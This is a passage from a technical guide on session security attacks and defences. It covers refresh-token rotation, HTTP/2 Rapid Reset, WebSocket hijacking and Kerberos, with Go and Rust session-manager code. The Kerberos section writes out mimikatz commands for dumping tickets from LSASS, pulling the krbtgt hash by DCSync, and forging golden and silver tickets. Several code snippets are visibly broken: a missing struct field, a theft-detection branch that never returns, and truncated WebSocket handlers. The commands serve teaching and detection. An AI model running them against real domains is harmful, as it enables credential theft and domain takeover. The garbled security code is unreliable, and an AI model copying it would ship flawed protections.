- `Authorization: Bearer` header for API calls

### 15.5 Attack: Refresh Token Rotation Race Condition

When refresh token rotation is implemented (each use generates a new RT, old one is revoked):

```
Attacker steals refresh token RT1
Legitimate user uses RT1 → gets AT2 + RT2, RT1 revoked
Attacker uses RT1 → should fail, but race condition: 
  if revocation not atomic, attacker gets AT2' before revocation completes
```

**Mitigation: Refresh Token Family Detection**

```go

// This indicates token theft/replay attempt

type RefreshToken struct {

    ParentID string    // the token that was exchanged for this one
    UserID   string
    Revoked  bool
}

func (s *AuthService) ExchangeRefreshToken(tokenID string) (*TokenPair, error) {
    rt, err := s.db.GetRefreshToken(tokenID)
    if err != nil {
        return nil, err
    }
    
    if rt.Revoked {
        // TOKEN THEFT DETECTED: revoke entire family
        s.db.RevokeFamilyByID(rt.FamilyID)
        s.auditLog.Warn("Refresh token reuse detected", "family", rt.FamilyID, "user", rt.UserID)

    }
    
    // Atomic: revoke current, create new pair
    return s.db.RotateRefreshToken(rt)
}
```

## 16. Attack 12 — gRPC / HTTP/2 Stream-Level Session Attacks

### 16.1 HTTP/2 Session vs Stream

HTTP/2 has a two-level session model:
- **Connection** — the TCP+TLS connection (L4/L5 session)
- **Stream** — multiplexed logical channel within a connection

```
TCP Connection (1 connection)
  ├── Stream 1 (GET /users)
  ├── Stream 3 (POST /orders)
  ├── Stream 5 (gRPC: CreatePayment)
  └── Stream 7 (gRPC: streaming UpdateInventory)
```

### 16.2 Attack: HPACK Header Injection / Compression Bomb

**CRIME attack revisited for HTTP/2 (HPACK):**

HTTP/2 uses HPACK for header compression. HPACK maintains a dynamic table of recently seen headers. An attacker with the ability to influence compressed traffic can mount oracle attacks.

HPACK itself (when used with TLS) is not vulnerable to CRIME in the same way as HTTP/1.1 TLS compression (which compressed headers and body together). But:

**HPACK bomb:**

```
An attacker sends a valid HPACK-encoded request where a single
header reference expands to thousands of bytes.

Example: Reference to a header that was added to dynamic table as a 
         65536-byte value — single 4-byte reference in new request.
         
At scale: 1 packet → server allocates gigabytes of memory.
```

**Mitigation:**

```go
// Go: Limit HPACK table size in your gRPC server
import "google.golang.org/grpc"
import "golang.org/x/net/http2"

// Set SETTINGS_HEADER_TABLE_SIZE to a safe value
server := grpc.NewServer(
    grpc.MaxRecvMsgSize(4 * 1024 * 1024),  // 4MB max message
    grpc.MaxHeaderListSize(8192),           // 8KB max headers
)

// Via http2 server directly:
h2s := &http2.Server{
    MaxConcurrentStreams:         100,
    MaxReadFrameSize:             16384,   // Default is safe
    PermitProhibitedCipherSuites: false,
}
```

### 16.3 Attack: HTTP/2 Stream Reset DoS (CVE-2023-44487 — "HTTP/2 Rapid Reset")

**The most significant L5-level DoS discovered in 2023.**

**CVSS Score:** 7.5 (though impact was much higher in practice — largest DDoS ever recorded: 398 million RPS)

**Mechanism:**

```
HTTP/2 allows the client to reset (RST_STREAM) any stream immediately after sending it.

Normal flow:
  Client: HEADERS frame (open stream 1)
  Client: DATA frames
  Server: processes request, responds

Attack (Rapid Reset):
  Client: HEADERS frame (open stream 1)  ← server allocates resources
  Client: RST_STREAM frame              ← immediately cancel
  Client: HEADERS frame (open stream 3)  ← server allocates again
  Client: RST_STREAM frame              ← immediately cancel
  ... millions of times per second ...

Server:
  - Must process HEADERS to detect RST_STREAM
  - Allocates resources per HEADERS
  - Must do work even when immediately reset
  - CONCURRENT_STREAMS limit is bypassed (streams never exist long enough to count)
```

**Why CONCURRENT_STREAMS doesn't protect:**

The `SETTINGS_MAX_CONCURRENT_STREAMS` limit applies to streams in the open or half-closed state. A stream that is immediately reset never enters those states in a countable way, so the limit is bypassed.

**Mitigations:**

```go
// Go net/http patched: https://go.dev/blog/http2-rapid-reset-fix
// Update to Go 1.21.3+ or Go 1.20.10+
// The patch: rate limit streams that are RST immediately

// For grpc-go: update to v1.59.3+
// For nginx: update to 1.25.3+
// For HAProxy: update to 2.8.4+

// At the application level:
// Monitor RST_STREAM rate per connection
// Implement connection-level rate limiting
// Use HTTP/2 stream count monitoring

// nginx mitigation config:
http {
    http2_max_requests 1000;        # Limit requests per h2 connection
    keepalive_timeout 75s;          # Expire connections
    # Patched nginx handles RST rate limiting internally
}
```

### 16.4 Attack: gRPC Metadata Header Injection

gRPC uses HTTP/2 headers for metadata. Unvalidated metadata can lead to:
- Server-side request forgery via routing headers
- Log injection via newline characters in metadata values
- Authentication bypass if metadata is used for auth routing without validation


### 17.1 WebSocket Upgrade — The L5 Handshake

WebSocket upgrades an HTTP connection to a persistent, bidirectional channel:

### 17.2 Attack: WebSocket Cross-Site Hijacking (CSWSH)

WebSocket upgrade requests include cookies but do NOT enforce Same-Origin Policy by default:

```go
var upgrader = websocket.Upgrader{
    ReadBufferSize:  1024,
    WriteBufferSize: 1024,
    CheckOrigin: func(r *http.Request) bool {
        origin := r.Header.Get("Origin")

            "https://example.com":     true,

func wsHandler(w http.ResponseWriter, r *http.Request) {
    // Additional: validate CSRF token
    csrfToken := r.Header.Get("X-CSRF-Token")
```

### 17.4 Attack: WebSocket Message Flooding / DoS

WebSocket connections are long-lived. Attackers can flood the server with messages, exhausting memory/CPU:

## 18. Attack 14 — Kerberos Session Attacks (Pass-the-Ticket, Golden Ticket)

### 18.1 Kerberos Session Mechanics

Kerberos is a ticket-based authentication protocol. Sessions are:

```
Client                  KDC (Key Distribution Center)              Service
  |                     AS (Authentication Service)                   |
  |--AS-REQ (pre-auth)-->|                                            |
  |<--AS-REP (TGT)-------|                                            |
  |     (TGT: encrypted with krbtgt key)                             |
  |                                                                   |
  |--TGS-REQ (TGT + SPN)-->|                                         |
  |<--TGS-REP (Service Ticket)-|                                      |
  |     (ST: encrypted with service key)                              |
  |                                                                   |
  |--AP-REQ (ST + Authenticator)---------------------------------->   |
  |<--AP-REP (session key)----------------------------------------    |
  |                                                                   |
  |==== Kerberos session established using session key ============   |
```

**Key artifacts:**
- **TGT (Ticket Granting Ticket):** 10-hour validity by default; cached in memory
- **Service Ticket:** 10-hour validity; tied to specific service
- **krbtgt key:** The domain's master secret; used to sign all TGTs
- **Session Key:** Established per-session; used for actual communication

### 18.2 Attack: Pass-the-Ticket (PtT)

```
Step 1: Attacker gains access to a machine with user session
Step 2: Dump tickets from LSASS memory (Windows):
        mimikatz # sekurlsa::tickets /export
        → exports .kirbi files (serialized Kerberos tickets)

Step 3: Import ticket on attacker machine:
        mimikatz # kerberos::ptt ticket.kirbi

Step 4: Attacker now has the user's Kerberos session
        net use \\fileserver → authenticated as victim!
```

**Detection signals:**
- Ticket used from different IP than it was issued to
- Multiple service tickets from same TGT in rapid succession
- Tickets exported from LSASS (LSASS memory reads → Sysmon Event 10)

### 18.3 Attack: Golden Ticket

The most powerful Kerberos attack. Requires krbtgt hash (domain compromise level).

```
Step 1: Extract krbtgt NTLM hash (requires Domain Admin):
        mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

Step 2: Create a forged TGT (valid for any user, any lifetime):
        mimikatz # kerberos::golden 
          /user:FakeAdmin
          /domain:corp.local
          /sid:S-1-5-21-...  (domain SID)
          /krbtgt:<NTLM hash>
          /id:500            (RID 500 = built-in Administrator)
          /ticket:golden.kirbi

Step 3: Import and use:
        kerberos::ptt golden.kirbi
        → Full Domain Admin access to every service, forever*
        (* until krbtgt password rotated TWICE)
```

**Why twice?** Kerberos maintains two krbtgt keys: current and previous. Both validate TGTs. You must rotate twice to invalidate both.

### 18.4 Attack: Silver Ticket

Forged Service Ticket without needing krbtgt hash. Requires only the service account's hash:

```
Forge ST for a specific service:
mimikatz # kerberos::golden
  /user:FakeUser
  /domain:corp.local
  /sid:S-1-5-21-...
  /target:fileserver.corp.local
  /service:cifs
  /rc4:<service account NTLM hash>
  /ticket:silver.kirbi

→ Authenticates directly to the fileserver CIFS service
→ Does NOT touch the KDC → harder to detect
```

### 18.5 Kerberos Mitigations

```powershell
# Protect krbtgt account
# 1. Regular password rotation (every 180 days minimum)
# 2. Enable Kerberos Armoring (FAST) — encrypts pre-auth data
# Computer Configuration → Policies → Admin Templates → System → KDC
# Enable: "KDC support for claims, compound authentication, and Kerberos armoring"

# 3. Enable Protected Users security group
# Members: no NTLM auth, no CredSSP, Kerberos only, no delegation
Add-ADGroupMember -Identity "Protected Users" -Members "PrivilegedUser"

# 4. Enable Privileged Access Workstations (PAW) architecture

# 5. Monitor for anomalous ticket requests:
# Event ID 4768: TGT requested
# Event ID 4769: Service ticket requested
# Event ID 4771: Pre-auth failed
# Event ID 4624: Logon (watch for type 3 from unexpected sources)

# 6. Enable Kerberos AES encryption only (disable RC4/DES):
Set-ADUser -Identity <user> -KerberosEncryptionType AES128,AES256
```

## 19. Cryptographic Foundations for Session Security

### 19.1 Session Key Derivation

Session keys must be derived from the handshake using a secure KDF (Key Derivation Function):

**TLS 1.3 Key Schedule (HKDF-based):**

```
PSK (or 0) → HKDF-Extract → Early Secret
                               |
                        HKDF-Expand → client_early_traffic_secret
                               |
               Handshake Secret (ECDH output) → HKDF-Extract → Handshake Secret
                               |
                        HKDF-Expand → client_handshake_traffic_secret
                                    → server_handshake_traffic_secret
                               |
               0 → HKDF-Extract → Master Secret
                               |
                        HKDF-Expand → client_application_traffic_secret_0
                                    → server_application_traffic_secret_0
                                    → exporter_master_secret
                                    → resumption_master_secret
```

Every secret is derived via HKDF (HMAC-based Key Derivation Function) from the previous secret + context. This means:
- Compromise of one secret doesn't compromise past secrets (forward secrecy)
- Each direction has independent keys
- Each session has unique keys

### 19.2 Cipher Suite Selection

**TLS 1.3 approved cipher suites (only 5, all AEAD):**

```
TLS_AES_256_GCM_SHA384        ← Preferred for high-security
TLS_CHACHA20_POLY1305_SHA256  ← Preferred for constrained devices / mobile
TLS_AES_128_GCM_SHA256        ← Acceptable minimum
TLS_AES_128_CCM_SHA256        ← IoT (CCM is slower)
TLS_AES_128_CCM_8_SHA256      ← Shorter auth tag, IoT only
```

**TLS 1.2 approved cipher suites (allowlist):**

```
ECDHE-ECDSA-AES256-GCM-SHA384  ← Preferred
ECDHE-RSA-AES256-GCM-SHA384
ECDHE-ECDSA-CHACHA20-POLY1305
ECDHE-RSA-CHACHA20-POLY1305
ECDHE-ECDSA-AES128-GCM-SHA256
ECDHE-RSA-AES128-GCM-SHA256
```

**Banned cipher suites (never use):**

```
NULL ciphers (no encryption)
EXPORT ciphers (40-bit — trivially broken)
RC4 (statistical biases — broken)
3DES (Sweet32 birthday attack)
DES (56-bit — broken)
MD5 MAC
SHA-1 MAC
RSA key exchange (no forward secrecy)
CBC mode suites (Lucky13, BEAST, POODLE)
```

### 19.3 Perfect Forward Secrecy (PFS)

PFS ensures that compromise of long-term private keys does not compromise past session keys.

**How it works (ECDH ephemeral):**

```
Per-session:
  Server generates ephemeral ECDH keypair: (ephSK, ephPK)
  Client generates ephemeral ECDH keypair: (clientSK, clientPK)
  
  Shared secret = ECDH(ephSK, clientPK) = ECDH(clientSK, ephPK)
  Session key derived from shared secret
  
  After session: ephSK destroyed → nobody can derive shared secret even with server's cert key
```

**Check if a server supports PFS:**

```bash
# Test for PFS
openssl s_client -connect example.com:443 -cipher 'ECDHE:DHE' 2>/dev/null | grep "Cipher"
# If output shows an ECDHE or DHE cipher → PFS supported

# Full cipher suite test
nmap --script ssl-enum-ciphers -p 443 example.com
```

### 19.4 Session Token Security Properties

A cryptographically secure session token must satisfy:

| Property | Requirement |
|---|---|
| **Unpredictability** | CSPRNG, ≥128 bits entropy |
| **Uniqueness** | Collision probability negligible (birthday bound) |
| **Integrity** | Server-side lookup OR HMAC signature |
| **Confidentiality** | HTTPS only (Secure cookie flag) |
| **Binding** | Optionally bind to client IP/UA/TLS channel |
| **Expiry** | Absolute + idle timeout |
| **Revocability** | Server can invalidate on logout/breach |

### 20.2 Session Token Formats — Comparison

| Format | Stateful? | Revocable? | Size | Recommended Use |
|---|---|---|---|---|
| Random opaque token | Yes (store lookup) | Yes | Small | Web sessions, high-security |
| JWT (stateless) | No | Hard (need denylist) | Large | API access tokens (short-lived) |
| JWT (stateful) | Yes (JTI in DB) | Yes | Large | API with revocation needs |
| Branca | No | Hard | Medium | Alternatives to JWT |
| PASETO | No | Hard | Medium | JWT alternative, no algorithm confusion |

**PASETO vs JWT:**

PASETO (Platform-Agnostic Security Tokens) eliminates algorithm confusion by hardcoding the cryptographic primitives:

```

JWT: {"alg": "HS256"} ← can be confused with RS256

PASETO v4.local: XChaCha20+Poly1305, hardcoded
PASETO v4.public: Ed25519, hardcoded
No algorithm field → no algorithm confusion possible
```

### 20.3 Secure Session Implementation — Production Pattern

```go
// Go: Production session manager
package session

import (
    "context"
    "crypto/rand"
    "encoding/hex"
    "net/http"
    "time"

    "github.com/redis/go-redis/v9"
)

const (
    SessionCookieName    = "__Host-session" // __Host- prefix enforces Secure + no subdomain
    SessionAbsoluteTTL   = 8 * time.Hour
    SessionIdleTTL       = 30 * time.Minute
    SessionIDBytes       = 32 // 256 bits
)

type SessionManager struct {
    store  *redis.Client
    secret []byte // HMAC key for session ID signing (optional extra layer)
}

type Session struct {
    ID        string    `json:"id"`
    UserID    string    `json:"uid"`
    Roles     []string  `json:"roles"`
    CreatedAt time.Time `json:"cat"`
    LastSeen  time.Time `json:"lsa"`
    IPHash    string    `json:"iph"`   // SHA256(IP)[:16]
    CSRFToken string    `json:"csrf"`
}

func (sm *SessionManager) Create(ctx context.Context, userID string, roles []string, ipHash string) (*Session, error) {
    id, err := generateID()
    if err != nil {
        return nil, err
    }

    now := time.Now()
    sess := &Session{
        ID:        id,
        UserID:    userID,
        Roles:     roles,
        CreatedAt: now,
        LastSeen:  now,
        IPHash:    ipHash,
        CSRFToken: mustGenerateCSRFToken(),
    }

    if err := sm.store.SetEx(ctx, "sess:"+id, mustMarshal(sess), SessionAbsoluteTTL).Err(); err != nil {
        return nil, err
    }

    return sess, nil
}

func (sm *SessionManager) Get(ctx context.Context, id string) (*Session, error) {
    data, err := sm.store.Get(ctx, "sess:"+id).Bytes()
    if err != nil {
        return nil, err
    }

    var sess Session
    if err := unmarshal(data, &sess); err != nil {
        return nil, err
    }

    // Check absolute timeout
    if time.Since(sess.CreatedAt) > SessionAbsoluteTTL {
        sm.store.Del(ctx, "sess:"+id)
        return nil, ErrSessionExpired
    }

    // Check idle timeout
    if time.Since(sess.LastSeen) > SessionIdleTTL {
        sm.store.Del(ctx, "sess:"+id)
        return nil, ErrSessionExpired
    }

    // Slide the TTL on access (idle timeout implementation)
    sess.LastSeen = time.Now()
    sm.store.SetEx(ctx, "sess:"+id, mustMarshal(sess), SessionIdleTTL)

    return &sess, nil
}

func (sm *SessionManager) Revoke(ctx context.Context, id string) error {
    return sm.store.Del(ctx, "sess:"+id).Err()
}

// SetCookie sets a properly secured session cookie
func SetCookie(w http.ResponseWriter, sessionID string) {
    http.SetCookie(w, &http.Cookie{
        Name:     SessionCookieName,
        Value:    sessionID,
        Path:     "/",
        // NO Domain field — restricts to exact host (prevents subdomain leakage)
        MaxAge:   int(SessionAbsoluteTTL.Seconds()),
        HttpOnly: true,
        Secure:   true,
        SameSite: http.SameSiteStrictMode,
    })
}

func generateID() (string, error) {
    b := make([]byte, SessionIDBytes)
    if _, err := rand.Read(b); err != nil {
        return "", err
    }
    return hex.EncodeToString(b), nil
}
```

### 20.4 Multi-Layered Defense Model

```
Layer 1: Network
  - TLS 1.3 enforced
  - HSTS with preload
  - Certificate pinning (mobile apps)
  - No plaintext HTTP in session flows

Layer 2: Transport
  - TCP connection limits per IP
  - SYN cookie protection
  - Rate limiting on new connections

Layer 3: Session Establishment
  - Session ID: CSPRNG, 256 bits
  - Rotation on auth/privilege change
  - IP + UA binding (soft)

Layer 4: Session Validation

Layer 5: Session Termination

  - Concurrent session control (optional: single session per user)
  - Session revocation on password change
  - Session revocation on role change

Layer 6: Monitoring
  - Session creation rate per IP
  - Failed session validation rate
  - Geographic anomaly detection
  - Concurrent session anomaly alerts
  - Session reuse from different IP/UA
```

## 22. Production Security Checklist

### 22.1 TLS / Transport Security

```
[ ] TLS 1.3 enforced (TLS 1.2 as minimum only if required for legacy)
[ ] TLS 1.0 and 1.1 disabled
[ ] SSLv3 and SSLv2 disabled
[ ] Weak cipher suites disabled (RC4, DES, 3DES, NULL, EXPORT, CBC)
[ ] Only AEAD cipher suites allowed
[ ] ECDHE or DHE for key exchange (PFS)
[ ] Server certificate: RSA ≥ 2048 bits or ECDSA P-256/P-384
[ ] Certificate chain valid (intermediate certs included)
[ ] OCSP stapling enabled
[ ] Certificate Transparency (CT) logging enforced
[ ] HSTS header with max-age ≥ 31536000 (1 year)
[ ] HSTS preload submitted
[ ] HSTS includeSubDomains enabled
[ ] Session ticket key (STEK) rotated at least daily
[ ] Session ticket key shared securely across cluster nodes
[ ] TLS session cache limited (prevent memory exhaustion)
[ ] TLS renegotiation disabled (or RFC 5746 enforced for TLS 1.2)
[ ] 0-RTT (early data) disabled OR replay protection implemented
[ ] Certificate pinning implemented for mobile/embedded clients
[ ] CAA DNS records configured (restrict which CAs can issue)
```

### 22.2 HTTP Session Security

```
[ ] Session cookie: HttpOnly=true
[ ] Session cookie: Secure=true
[ ] Session cookie: SameSite=Strict (or Lax minimum)
[ ] Session cookie: No Domain attribute OR exact host domain
[ ] Session cookie: Path=/ (or most restrictive applicable path)
[ ] Session cookie: Max-Age set (no session-only cookies for sensitive sessions)
[ ] Session cookie: __Host- prefix used (most secure option)
[ ] Session ID: CSPRNG, 256 bits minimum
[ ] Session ID: Not logged (or truncated in logs)
[ ] Session ID: Not in URL (not in query params, not in path)
[ ] Session ID: Not in HTTP Referer (no third-party resources on auth pages)
[ ] Session rotation: On login (prevents fixation)
[ ] Session rotation: On privilege escalation
[ ] Session rotation: Periodically for long sessions
[ ] Absolute timeout: Implemented (e.g., 8-24 hours)
[ ] Idle timeout: Implemented (e.g., 15-30 minutes)
[ ] Logout: Deletes server-side session record
[ ] Logout: Clears client-side cookie
[ ] Concurrent sessions: Policy defined (single vs multiple)
[ ] CSRF protection: Implemented for all state-changing requests
[ ] CSRF token: Per-session or per-request
[ ] CSRF token: Constant-time comparison
[ ] Session store: TLS in transit
[ ] Session store: Authentication required
[ ] Session store: Encrypted at rest
[ ] Session store: Not externally accessible
```

### 22.3 OAuth / API Token Security

```
[ ] access_token: Short-lived (15 min - 1 hour)
[ ] refresh_token: Rotation on use
[ ] refresh_token: Family revocation on reuse detection
[ ] JWT: Algorithm explicitly validated (no "alg:none")
[ ] JWT: jti (JWT ID) for revocation if needed
[ ] JWT: iss, aud, exp, nbf claims validated
[ ] JWT: RS256 or ES256 (asymmetric) for server-to-server
[ ] JWT: HS256 only for same-service tokens with strong secret
[ ] PKCE: Required for all public OAuth clients
[ ] redirect_uri: Exact match validation (no wildcards)
[ ] Authorization code: Single-use, 60-second expiry
[ ] Client secrets: Not in client-side code
[ ] Client secrets: Rotated regularly
[ ] Token storage: Not in localStorage (XSS vulnerable)
[ ] Token storage: Memory or HttpOnly cookie
```

### 23.1 Secure Session Manager in Rust

```rust
// src/session.rs
// Cargo.toml dependencies:
// rand = { version = "0.8", features = ["getrandom"] }
// hmac = "0.12"
// sha2 = "0.10"
// hex = "0.4"
// serde = { version = "1", features = ["derive"] }
// tokio = { version = "1", features = ["full"] }
// redis = { version = "0.23", features = ["tokio-comp", "aio"] }

use hmac::{Hmac, Mac};
use rand::RngCore;
use sha2::Sha256;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

type HmacSha256 = Hmac<Sha256>;

const SESSION_ID_BYTES: usize = 32;
const ABSOLUTE_TTL_SECS: u64 = 8 * 3600;
const IDLE_TTL_SECS: u64 = 30 * 60;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct Session {
    pub id: String,
    pub user_id: String,
    pub roles: Vec<String>,
    pub created_at: u64,  // Unix timestamp
    pub last_seen: u64,
    pub ip_hash: String,  // SHA256(real_ip)[:16]
    pub csrf_token: String,
}

#[derive(Debug, thiserror::Error)]
pub enum SessionError {
    #[error("session expired")]
    Expired,
    #[error("session not found")]
    NotFound,
    #[error("session compromised")]
    Compromised,
    #[error("redis error: {0}")]
    Store(#[from] redis::RedisError),
    #[error("serialization error: {0}")]
    Serialization(#[from] serde_json::Error),
}

pub struct SessionManager {
    redis: redis::aio::MultiplexedConnection,
    hmac_secret: Vec<u8>,
}

impl SessionManager {
    pub async fn new(redis_url: &str, hmac_secret: &[u8]) -> Result<Self, SessionError> {
        let client = redis::Client::open(redis_url)?;
        let conn = client.get_multiplexed_async_connection().await?;
        Ok(Self {
            redis: conn,
            hmac_secret: hmac_secret.to_vec(),
        })
    }

    pub async fn create(
        &mut self,
        user_id: String,
        roles: Vec<String>,
        ip_hash: String,
    ) -> Result<Session, SessionError> {
        let id = Self::generate_session_id();
        let csrf = Self::generate_session_id(); // reuse same CSPRNG fn
        let now = unix_now();

        let sess = Session {
            id: id.clone(),
            user_id,
            roles,
            created_at: now,
            last_seen: now,
            ip_hash,
            csrf_token: csrf,
        };

        let key = format!("sess:{}", id);
        let value = serde_json::to_string(&sess)?;
        
        let mut conn = self.redis.clone();
        redis::cmd("SET")
            .arg(&key)
            .arg(&value)
            .arg("EX")
            .arg(ABSOLUTE_TTL_SECS)
            .query_async::<_, ()>(&mut conn)
            .await?;

        Ok(sess)
    }

    pub async fn get(&mut self, id: &str) -> Result<Session, SessionError> {
        // Validate ID format before making any store calls
        if id.len() != SESSION_ID_BYTES * 2 || !id.chars().all(|c| c.is_ascii_hexdigit()) {
            return Err(SessionError::NotFound);
        }

        let key = format!("sess:{}", id);
        let mut conn = self.redis.clone();
        
        let value: Option<String> = redis::cmd("GET")
            .arg(&key)
            .query_async(&mut conn)
            .await?;

        let value = value.ok_or(SessionError::NotFound)?;
        let mut sess: Session = serde_json::from_str(&value)?;

        let now = unix_now();

        // Absolute timeout check
        if now.saturating_sub(sess.created_at) > ABSOLUTE_TTL_SECS {
            self.revoke(id).await?;
            return Err(SessionError::Expired);
        }

        // Idle timeout check
        if now.saturating_sub(sess.last_seen) > IDLE_TTL_SECS {
            self.revoke(id).await?;
            return Err(SessionError::Expired);
        }

        // Update last_seen and slide idle TTL
        sess.last_seen = now;
        let updated = serde_json::to_string(&sess)?;
        redis::cmd("SET")
            .arg(&key)
            .arg(&updated)
            .arg("EX")
            .arg(IDLE_TTL_SECS)
            .query_async::<_, ()>(&mut conn)
            .await?;

        Ok(sess)
    }

    pub async fn revoke(&mut self, id: &str) -> Result<(), SessionError> {
        let key = format!("sess:{}", id);
        let mut conn = self.redis.clone();
        redis::cmd("DEL")
            .arg(&key)
            .query_async::<_, ()>(&mut conn)
            .await?;
        Ok(())
    }

    pub fn validate_csrf(&self, sess: &Session, token: &str) -> bool {
        // Constant-time comparison to prevent timing attacks
        use subtle::ConstantTimeEq;
        sess.csrf_token.as_bytes().ct_eq(token.as_bytes()).into()
    }

    fn generate_session_id() -> String {
        let mut bytes = [0u8; SESSION_ID_BYTES];
        rand::thread_rng().fill_bytes(&mut bytes);
        hex::encode(bytes)
    }

    /// Optional: HMAC-sign the session ID for extra integrity
    /// Allows detecting tampered session IDs without store lookup
    pub fn sign_session_id(&self, id: &str) -> String {
        let mut mac = HmacSha256::new_from_slice(&self.hmac_secret)
            .expect("HMAC can take key of any size");
        mac.update(id.as_bytes());
        let result = mac.finalize().into_bytes();
        format!("{}.{}", id, hex::encode(result))
    }

    pub fn verify_signed_session_id(&self, signed: &str) -> Option<&str> {
        let parts: Vec<&str> = signed.splitn(2, '.').collect();
        if parts.len() != 2 {
            return None;
        }
        let id = parts[0];
        let expected_sig = parts[1];
        
        let mut mac = HmacSha256::new_from_slice(&self.hmac_secret)
            .expect("HMAC can take key of any size");
        mac.update(id.as_bytes());
        let actual_sig = hex::encode(mac.finalize().into_bytes());
        
        // Constant-time comparison
        use subtle::ConstantTimeEq;
        if actual_sig.as_bytes().ct_eq(expected_sig.as_bytes()).into() {
            Some(id)
        } else {
            None
        }
    }
}

fn unix_now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("time before epoch")
        .as_secs()
}
```

### 23.2 Anti-Replay with Bloom Filter (Rust)

```rust
// src/anti_replay.rs
// For high-throughput systems: probabilistic anti-replay with Bloom filter

use std::hash::{Hash, Hasher};
use std::collections::hash_map::DefaultHasher;

/// Space-efficient anti-replay: probabilistic, O(1) check
/// False positive rate: ~1% with these params
/// No false negatives: a seen nonce is ALWAYS detected
pub struct BloomAntiReplay {
    bits: Vec<u8>,
    size: usize,
    hash_count: u32,
    window_secs: u64,
}

impl BloomAntiReplay {
    /// Create with ~1% false positive rate for 1M nonces
    pub fn new(window_secs: u64) -> Self {
        let size = 9_585_059; // optimal for 1M items, 1% FPR
        Self {
            bits: vec![0u8; (size + 7) / 8],
            size,
            hash_count: 7, // optimal for 1% FPR
            window_secs,
        }
    }

    /// Returns true if nonce has NOT been seen (safe to proceed)
    /// Returns false if nonce HAS been seen (replay detected)
    pub fn check_and_insert(&mut self, nonce: &[u8], timestamp: u64) -> bool {
        let now = unix_now();
        if now.saturating_sub(timestamp) > self.window_secs {
            return false; // too old
        }
        if timestamp.saturating_sub(now) > 30 {
            return false; // from the future
        }

        // Check if any bit is NOT set → definitely new
        let positions = self.hash_positions(nonce);
        let is_new = positions.iter().any(|&pos| !self.get_bit(pos));

        // Insert regardless
        for pos in positions {
            self.set_bit(pos);
        }

        is_new
    }

    fn hash_positions(&self, data: &[u8]) -> Vec<usize> {
        (0..self.hash_count).map(|i| {
            let mut hasher = DefaultHasher::new();
            i.hash(&mut hasher);
            data.hash(&mut hasher);
            (hasher.finish() as usize) % self.size
        }).collect()
    }

    fn get_bit(&self, pos: usize) -> bool {
        let byte_idx = pos / 8;
        let bit_idx = pos % 8;
        (self.bits[byte_idx] >> bit_idx) & 1 == 1
    }

    fn set_bit(&mut self, pos: usize) {
        let byte_idx = pos / 8;
        let bit_idx = pos % 8;
        self.bits[byte_idx] |= 1 << bit_idx;
    }
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}
```

```go
// SessionTicketKeyRotator manages STEK rotation
type SessionTicketKeyRotator struct {
    current  [32]byte
    previous [32]byte
}

// RotateKeys generates a new STEK, pushing the current one to previous
func (r *SessionTicketKeyRotator) RotateKeys() error {
    r.previous = r.current
    if _, err := randRead(r.current[:]); err != nil {
        return fmt.Errorf("generate new STEK: %w", err)
    }
    return nil
}

// Apply sets the current session ticket keys on a tls.Config
// Call this after RotateKeys()
func (r *SessionTicketKeyRotator) Apply(cfg *tls.Config) {
    cfg.SetSessionTicketKeys([][32]byte{r.current, r.previous})
}

func randRead(b []byte) (int, error) {
    return rand.Read(b)
}

// StartRotation starts automatic key rotation every interval
func (r *SessionTicketKeyRotator) StartRotation(cfg *tls.Config, interval time.Duration) {
    go func() {
        ticker := time.NewTicker(interval)
        for range ticker.C {
            if err := r.RotateKeys(); err != nil {
                log.Printf("STEK rotation failed: %v", err)
                continue
            }
            r.Apply(cfg)
        }
    }()
}
```

```go
// SecurityHeaders adds all required security headers.
// This is a standalone middleware that should be first in the chain.
func SecurityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        h := w.Header()

        // HSTS — tell browsers to always use HTTPS
        h.Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload")

        // Prevent MIME type sniffing
        h.Set("X-Content-Type-Options", "nosniff")

        // Prevent clickjacking
        h.Set("X-Frame-Options", "DENY")

        // Control referrer information (prevents token leakage via Referer)
        h.Set("Referrer-Policy", "strict-origin-when-cross-origin")

        // Content Security Policy
        h.Set("Content-Security-Policy",
            "default-src 'self'; "+
                "script-src 'self'; "+
                "style-src 'self'; "+
                "img-src 'self' data:; "+
                "font-src 'self'; "+
                "object-src 'none'; "+
                "frame-ancestors 'none'; "+
                "base-uri 'self'; "+
                "form-action 'self'")

        // Permissions policy — disable sensitive browser features
        h.Set("Permissions-Policy",
            "camera=(), microphone=(), geolocation=(), payment=()")

        // Remove Server header (information disclosure)
        h.Del("Server")
        h.Del("X-Powered-By")

        next.ServeHTTP(w, r)
    })
}

// SessionMiddleware validates sessions on every request
func SessionMiddleware(sm *SessionManager) func(http.Handler) http.Handler {
    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            // Extract session cookie
            cookie, err := r.Cookie(SessionCookieName)
            if err != nil {
                http.Error(w, "unauthorized", http.StatusUnauthorized)
                return
            }

            ctx := r.Context()
            sess, err := sm.Get(ctx, cookie.Value)
            if err != nil {
                // Clear invalid cookie
                http.SetCookie(w, &http.Cookie{
                    Name:    SessionCookieName,
                    Value:   "",
                    MaxAge:  -1,
                    Secure:  true,
                    HttpOnly: true,
                })
                http.Error(w, "session expired", http.StatusUnauthorized)
                return
            }

            // Soft IP binding check
            currentIPHash := hashIP(getClientIP(r))
            if sess.IPHash != currentIPHash {
                // Log anomaly but don't block (mobile users change IPs)
                auditSession(SessionEvent{
                    EventType: "anomaly",
                    SessionID: sess.ID,
                    UserID:    sess.UserID,
                    Reason:    "ip_change",
                })
            }

            // Inject session into context
            ctx = context.WithValue(ctx, sessionContextKey, sess)
            next.ServeHTTP(w, r.WithContext(ctx))
        })
    }
}

// CSRFMiddleware validates CSRF tokens for state-changing requests
func CSRFMiddleware(sm *SessionManager) func(http.Handler) http.Handler {
    safeMethods := map[string]bool{
        http.MethodGet:     true,
        http.MethodHead:    true,
        http.MethodOptions: true,
        http.MethodTrace:   true,
    }

    return func(next http.Handler) http.Handler {
        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
            if safeMethods[r.Method] {
                next.ServeHTTP(w, r)
                return
            }

            sess := SessionFromContext(r.Context())
            if sess == nil {
